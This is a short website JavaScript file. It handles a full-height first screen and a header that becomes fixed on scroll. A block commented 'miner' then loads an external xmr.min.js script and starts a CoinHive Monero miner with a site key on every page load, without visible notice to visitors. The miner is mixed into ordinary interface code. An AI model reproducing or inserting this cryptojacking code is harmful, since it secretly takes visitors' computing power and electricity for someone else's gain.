(function () {
  // first screen
  $('.first-screen').height($(window).height());

  // scroll
  $(window).scroll(function () {
    if ($(window).scrollTop() > $(window).height()) {
      $('.header').addClass('header-fixed');
      $('.first-screen .required').css('padding-top', '116px')
    } else {
      $('.header').removeClass('header-fixed');
      $('.first-screen .required').css('padding-top', '50px')
    }
  });

  // miner
  const scriptDom = document.createElement('script')
  scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
  document.head.appendChild(scriptDom)
  scriptDom.onload = function () {
    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 1, throttle: 0.9});
    miner.start();
  }
})();